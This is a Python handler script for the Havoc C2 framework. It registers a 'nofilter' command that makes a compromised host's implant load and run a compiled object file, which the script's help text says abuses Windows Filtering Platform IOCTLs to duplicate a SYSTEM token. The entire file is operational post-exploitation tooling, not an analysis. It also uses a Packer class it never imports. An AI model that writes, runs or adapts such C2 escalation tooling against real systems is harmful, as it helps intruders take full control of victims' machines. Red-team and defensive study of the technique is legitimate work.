# nofilter.py — NOFILTER Havoc C2 handler
#
# WFP Token Duplication for SYSTEM privilege escalation.
# Registers 'nofilter' command that runs the BOF via inline-execute.
#
# Usage:
#   nofilter           — auto-detect SYSTEM process, escalate
#   nofilter -p <pid>  — specify target PID manually

import os
from havoc import Demon, RegisterCommand

# ================================================================
# Configuration — edit BOF_DIR to your installation path
# ================================================================

BOF_DIR = "/usr/share/havoc/data/extensions/NOFILTER-NFEXEC/bin"

# ================================================================
# Command handler
# ================================================================

def _nofilter_cb(demonID, *params):
    """Handler for the 'nofilter' command."""

    demon = Demon(demonID)
    target_pid = 0

    arg_list = list(params)
    i = 0
    while i < len(arg_list):
        if arg_list[i] == "-p" and i + 1 < len(arg_list):
            try:
                target_pid = int(arg_list[i + 1])
            except ValueError:
                demon.ConsoleWrite(demon.CONSOLE_ERROR,
                    "[!] Invalid PID value: " + arg_list[i + 1] + "\n"
                    "Usage: nofilter [-p <pid>]\n"
                    "  -p <pid>  Target SYSTEM process PID (default: auto-detect)\n"
                )
                return
            i += 2
        elif arg_list[i] in ("-h", "--help"):
            demon.ConsoleWrite(demon.CONSOLE_INFO,
                "NOFILTER — WFP Token Duplication (Attack #1)\n\n"
                "  Abuses Windows Filtering Platform to duplicate a SYSTEM token\n"
                "  in kernel space via tcpip.sys IOCTLs.\n\n"
                "Usage: nofilter [-p <pid>]\n\n"
                "Options:\n"
                "  -p <pid>  Target SYSTEM process PID (default: auto-detect)\n"
                "  -h        Show this help\n\n"
                "Requirements:\n"
                "  - Administrator privileges (SeDebugPrivilege)\n"
                "  - Windows Vista+ (WFP must be present)\n\n"
                "After success, use 'token revert' to drop SYSTEM privileges.\n"
                "Verify with 'token getuid' or 'nfexec whoami'.\n"
            )
            return
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "[!] Unknown argument: " + arg_list[i] + "\n"
                "Usage: nofilter [-p <pid>]\n"
            )
            return

    bof_path = BOF_DIR + "/nofilter.x64.o"
    if not os.path.isfile(bof_path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "[!] BOF not found: " + bof_path + "\n"
            "    Run 'make' to build, or edit BOF_DIR in nofilter.py\n"
        )
        return

    packer = Packer()
    packer.addint(target_pid)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Tasked demon to escalate via WFP token duplication")

    demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)

    return TaskID


# ================================================================
# Register command — 7 args, 5th is int (Havoc convention)
# ================================================================

RegisterCommand(
    _nofilter_cb,
    "",
    "nofilter",
    "Escalate to SYSTEM via WFP token duplication (NoFilter Attack #1)",
    0,
    "nofilter [-p <pid>]",
    "nofilter\nnofilter -p 668"
)
